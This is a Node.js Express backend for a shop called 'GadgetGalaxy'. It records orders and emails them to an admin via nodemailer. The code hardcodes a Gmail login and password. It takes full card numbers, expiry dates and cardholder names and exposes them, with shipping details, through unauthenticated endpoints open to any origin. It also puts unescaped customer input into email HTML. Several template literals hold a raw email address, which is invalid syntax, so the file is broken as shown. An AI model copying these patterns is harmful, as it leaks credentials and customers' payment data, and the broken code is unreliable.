const express = require('express');
const nodemailer = require('nodemailer');
const app = express();

// CORS middleware
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    res.header('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

app.use(express.json());

let orders = [];

// ========== EMAIL CONFIGURATION ==========
// Sending email account (where emails are sent FROM)
const EMAIL_CONFIG = {
    service: 'gmail',
    auth: {
        user: 'alihassinhassin22@gmail.com',     // YOUR sending email
        pass: '@gadgalaxy223'            // ⚠️ REPLACE with App Password!
    },
    // Where to send order notifications (TO)
    adminEmail: 'caleborenge8@gmail.com',         // Notifications go here
    shopName: 'GadgetGalaxy'
};

// Create email transporter
const transporter = nodemailer.createTransport({
    service: EMAIL_CONFIG.service,
    auth: {
        user: EMAIL_CONFIG.auth.user,
        pass: EMAIL_CONFIG.auth.pass
    }
});

// Verify email connection on startup
transporter.verify((error, success) => {
    if (error) {
        console.log('❌ Email not configured. Error:', error);
        console.log('⚠️ Make sure you used an App Password, not your regular Gmail password.');
    } else {
        console.log('✅ Email ready! Notifications will be sent to:', EMAIL_CONFIG.adminEmail);
    }
});

// Function to send order notification email
async function sendOrderNotification(order) {
    // Build cart items HTML for email
    let cartItemsHtml = '';
    let totalAmount = 0;
    
    if (order.cartItems && order.cartItems.length > 0) {
        order.cartItems.forEach(item => {
            const itemTotal = item.price * item.quantity;
            totalAmount += itemTotal;
            cartItemsHtml += `
                <tr>
                    <td style="padding: 8px; border-bottom: 1px solid #ddd;">${item.name}</td>
                    <td style="padding: 8px; border-bottom: 1px solid #ddd; text-align: center;">${item.quantity}</td>
                    <td style="padding: 8px; border-bottom: 1px solid #ddd; text-align: right;">$${item.price.toFixed(2)}</td>
                    <td style="padding: 8px; border-bottom: 1px solid #ddd; text-align: right;">$${itemTotal.toFixed(2)}</td>
                </tr>
            `;
        });
    } else {
        totalAmount = order.amount || order.totalAmount || 0;
        cartItemsHtml = `
            <tr>
                <td style="padding: 8px; border-bottom: 1px solid #ddd;">${order.product || 'Product'}</td>
                <td style="padding: 8px; border-bottom: 1px solid #ddd; text-align: center;">1</td>
                <td style="padding: 8px; border-bottom: 1px solid #ddd; text-align: right;">$${totalAmount.toFixed(2)}</td>
                <td style="padding: 8px; border-bottom: 1px solid #ddd; text-align: right;">$${totalAmount.toFixed(2)}</td>
            </tr>
        `;
    }
    
    const emailHtml = `
        <!DOCTYPE html>
        <html>
        <head>
            <style>
                body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
                .container { max-width: 600px; margin: 0 auto; }
                .header { background: linear-gradient(135deg, #00d4ff, #7c3aed); padding: 20px; text-align: center; color: white; }
                .content { padding: 20px; }
                .order-details { background: #f8fafc; padding: 15px; border-radius: 8px; margin: 15px 0; }
                .order-table { width: 100%; border-collapse: collapse; }
                .order-table th { text-align: left; padding: 8px; background: #e2e8f0; }
                .total-row { font-weight: bold; background: #f1f5f9; }
                .footer { margin-top: 20px; text-align: center; font-size: 12px; color: #777; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h2>🛒 New Order Received!</h2>
                    <p>${EMAIL_CONFIG.shopName}</p>
                </div>
                <div class="content">
                    <h3>Order #${order.id}</h3>
                    <p><strong>Date:</strong> ${new Date(order.createdAt).toLocaleString()}</p>
                    <p><strong>Payment Method:</strong> ${order.paymentMethod.toUpperCase()}</p>
                    <p><strong>Customer Email:</strong> ${order.customerEmail}</p>
                    ${order.airtmUsername ? `<p><strong>Airtm Username:</strong> ${order.airtmUsername}</p>` : ''}
                    
                    <div class="order-details">
                        <h4>📦 Order Items</h4>
                        <table class="order-table">
                            <thead>
                                <tr><th>Product</th><th style="text-align:center">Qty</th><th style="text-align:right">Price</th><th style="text-align:right">Subtotal</th></tr>
                            </thead>
                            <tbody>
                                ${cartItemsHtml}
                                <tr class="total-row">
                                    <td colspan="3" style="padding: 8px; text-align: right;"><strong>TOTAL:</strong></td>
                                    <td style="padding: 8px; text-align: right;"><strong>$${totalAmount.toFixed(2)}</strong></td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                    
                    <div class="order-details">
                        <h4>📍 Shipping Address</h4>
                        <p>
                            ${order.shipping?.firstName} ${order.shipping?.lastName}<br>
                            ${order.shipping?.address}<br>
                            ${order.shipping?.city}, ${order.shipping?.state} ${order.shipping?.zip}<br>
                            ${order.shipping?.country}<br>
                            Phone: ${order.shipping?.phone}
                        </p>
                    </div>
                    
                    ${order.cardDetails ? `
                    <div class="order-details">
                        <h4>💳 Card Details (For POS)</h4>
                        <p>
                            Card: ****${order.cardDetails.cardNumber?.slice(-4)}<br>
                            Expiry: ${order.cardDetails.expiry}<br>
                            Cardholder: ${order.cardDetails.cardholderName}
                        </p>
                    </div>
                    ` : ''}
                </div>
                <div class="footer">
                    <p>Process this order in your admin dashboard.</p>
                    <p>${EMAIL_CONFIG.shopName} - Automated Notification</p>
                </div>
            </div>
        </body>
        </html>
    `;
    
    const mailOptions = {
        from: `"${EMAIL_CONFIG.shopName} Orders" <${EMAIL_CONFIG.auth.user}>`,
        to: EMAIL_CONFIG.adminEmail,
        subject: `🛒 New Order #${order.id} - ${EMAIL_CONFIG.shopName}`,
        html: emailHtml
    };
    
    try {
        await transporter.sendMail(mailOptions);
        console.log(`📧 Email notification sent to ${kelvinberns1@gmail.com} for order #${order.id}`);
    } catch (error) {
        console.log(`❌ Failed to send email:`, error.message);
    }
}

// ========== API ENDPOINTS ==========

// GET all orders
app.get('/api/orders', (req, res) => {
    res.json(orders);
});

// GET single order
app.get('/api/order/:id', (req, res) => {
    const order = orders.find(o => o.id === req.params.id);
    if (order) {
        res.json(order);
    } else {
        res.status(404).json({ error: 'Order not found' });
    }
});

// POST new order (WITH EMAIL NOTIFICATION)
app.post('/api/order', async (req, res) => {
    const orderData = req.body;
    
    const order = { 
        id: Date.now().toString(), 
        ...orderData, 
        createdAt: new Date().toISOString(),
        status: 'pending'
    };
    
    orders.push(order);
    
    console.log('\n========== NEW ORDER ==========');
    console.log(`Order ID: ${order.id}`);
    console.log(`Payment Method: ${order.paymentMethod}`);
    console.log(`Customer Email: ${order.customerEmail}`);
    console.log(`Total Amount: $${order.totalAmount || order.amount || 0}`);
    
    // SEND EMAIL NOTIFICATION
    await sendOrderNotification(order);
    
    console.log('================================\n');
    
    res.json({ 
        success: true, 
        orderId: order.id,
        message: `Order ${order.id} received successfully`
    });
});

// DELETE order
app.delete('/api/order/:id', (req, res) => {
    const index = orders.findIndex(o => o.id === req.params.id);
    if (index !== -1) {
        const deleted = orders.splice(index, 1);
        res.json({ success: true, deleted: deleted[0] });
    } else {
        res.status(404).json({ error: 'Order not found' });
    }
});

// Root route
app.get('/', (req, res) => {
    res.json({
        name: 'GadgetGalaxy API',
        status: 'running',
        emailNotifications: `Sending to ${kelvinberns1@gmail.com}`,
        endpoints: {
            'POST /api/order': 'Create new order (sends email notification)',
            'GET /api/orders': 'View all orders',
            'GET /api/order/:id': 'View single order',
            'DELETE /api/order/:id': 'Delete order'
        }
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 GadgetGalaxy backend running on port ${PORT}`);
    console.log(`📧 Email notifications will be sent to: ${kelvinberns1@gmail.com}`);
    console.log(`📧 From email: ${EMAIL_CONFIG.auth.user}`);
});
